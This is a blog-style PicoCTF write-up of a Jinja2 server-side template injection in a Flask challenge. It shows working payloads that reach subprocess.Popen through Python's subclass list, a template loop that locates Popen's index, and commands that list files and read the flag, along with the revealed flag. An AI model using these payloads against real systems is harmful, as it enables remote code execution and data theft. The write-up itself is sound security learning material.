+++
title = "My First SSTI Adventure: A PicoCTF Walkthrough"
description = "A step-by-step journey of exploiting a Server-Side Template Injection (SSTI) vulnerability in a PicoCTF challenge to achieve Remote Code Execution (RCE)."
date = "2025-09-09"
draft = false
tags = ["SSTI", "PicoCTF", "Cybersecurity", "Python", "Jinja2", "RCE"]
+++

I recently dove into the world of Server-Side Template Injection (SSTI) and it was a blast! I decided to tackle a PicoCTF challenge to test my skills, and it turned out to be a fantastic learning experience. Here’s a breakdown of my journey from finding the vulnerability to getting the flag, as it happened.

---

## What is SSTI?

SSTI, or Server-Side Template Injection, is a vulnerability that occurs when an attacker can inject malicious code into a template, which is then executed on the server. This can lead to serious consequences, including Remote Code Execution (RCE), allowing the attacker to run arbitrary commands on the server.

## The Challenge Begins

The PicoCTF challenge presented a simple website with an input field. Whatever I entered was "announced" on a new page. This immediately screamed "template engine" to me.

To confirm my suspicions, I used Wappalyzer, a browser extension that identifies technologies used on websites. It revealed the site was built with **Python 3.8.10** and **Flask 3.0.3**. The most common template engine for Flask is **Jinja2**, so that was my prime suspect.

My first test was to see if the server would execute a simple expression. I entered:

```jinja
{{ 7 * 7 }}
```

The result was `49`. Bingo! This confirmed three things:
1.  The application is vulnerable to SSTI.
2.  The server is using a Python and Flask setup.
3.  The template engine is likely Jinja2.

Now, the real question: could I take this from a simple calculation to full-blown RCE?

---

## The Path to RCE

My goal was to execute shell commands. In Python, the `subprocess.Popen` class is a powerful tool for this. The challenge was to access it from within the restricted Jinja2 template environment.

The standard payload to access subclasses in Python is:

```python
''.__class__.__base__.__subclasses__()
```

This gives you a list of all the classes loaded in the Python environment. I needed to find `Popen` in that list.

### Local Proof-of-Concept

On my local machine, I found that `Popen` was at index `294`. I could then use it to run commands like `id` and `ls -la`:

```python
# Execute 'id'
>>> ''.__class__.__base__.__subclasses__()[294]('id', shell=True, stdout=-1).communicate()

# Execute 'ls -la'
>>> ''.__class__.__base__.__subclasses__()[294]('ls -la', shell=True, stdout=-1).communicate()
(b'total 48\ndrwxr-xr-x@  7 satishpatra  staff   224  4 Sep 23:35 .\n...\n', None)
```

The output of `communicate()` is a tuple `(stdout, stderr)`, and `stdout` is a byte string. To get a clean string, I used `.communicate()[0].decode()` and `print()`:

```python
>>> print(''.__class__.__base__.__subclasses__()[294]('ls -la', shell=True, stdout=-1).communicate()[0].decode())
total 48
drwxr-xr-x@  7 satishpatra  staff   224  4 Sep 23:35 .
...
```

### The PicoCTF Roadblock

When I tried the same payload on the PicoCTF server, I hit a wall.

```jinja
{{ ''.__class__.__base__.__subclasses__()[294]('ls -la', shell=True, stdout=-1).communicate()[0].decode() }}
```

This resulted in an "Internal Server Error." Why? The index of `Popen` was different on the server. I was flying blind. I even tried to see what `{{ ''.__class__.__base__.__subclasses__() }}` would return, and I got `<class 'tempfile._TemporaryFileCloser'>`, which was not what I expected. The Python version on the server was `3.8.10`, which was different from my local setup.

My next step was to find the correct index of `Popen` on the target server. I couldn't just print the whole list of subclasses, so I used a loop within the template to search for it:

```jinja
{%- for c in ''.__class__.__base__.__subclasses__() -%}
{%- if 'Popen' in c.__name__ -%}
{{ c.__name__ }} {{ loop.index0 }}
{%- endif -%}
{%- endfor -%}
```

And there it was:

```
Popen 356
```

The index was `356`! I restarted the instance to see if it would change, but it remained the same. This meant I could reliably use this index for my payload.

---

## Victory!

Now, with the correct index, I could craft my final payload. I tried to use `print()` at first, but it kept causing errors:

```jinja
{{ print(''.__class__.__base__.__subclasses__()[356]('ls -la', shell=True, stdout=-1).communicate()[0].decode())
}}
```

This didn't work. The `format()` method, however, worked like a charm.

My final payload to list the files was:

```jinja
{{ 'Command Output --> {}'.format(''.__class__.__base__.__subclasses__()[356]('ls -la', shell=True, stdout=-1).communicate()[0].decode()) }}
```

While the output on the page was a bit messy, inspecting the HTML revealed the formatted output:

```html
<!doctype html>
<h1 style="font-size:100px;" align="center">Command Output --&gt; total 12
drwxr-xr-x 1 root root   25 Sep  8 18:44 .
drwxr-xr-x 1 root root   23 Sep  8 18:44 ..
drwxr-xr-x 2 root root   32 Sep  8 18:44 __pycache__
-rwxr-xr-x 1 root root 1241 May  1 15:59 app.py
-rw-r--r-- 1 root root   58 Aug 21 19:26 flag
-rwxr-xr-x 1 root root  268 May  1 15:59 requirements.txt
</h1>
```

I saw a `flag` file! The final step was to read it:

```jinja
{{ 'Command Output --> {}'.format(''.__class__.__base__.__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0].decode()) }}
```

Success! The flag was revealed:

**`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}`**

Decoding the flag gives us "server side template injections are cool." I couldn't decode the `bdc95c1a` part, which might be a hash. This was my first real dive into SSTI, and it was an incredibly rewarding experience. I'm excited to explore this vulnerability further!

---

## Related Posts

*   [Deepening My SSTI Knowledge: From Study to a Root-Me RCE](/post/ssti-study-and-rootme-challenge/)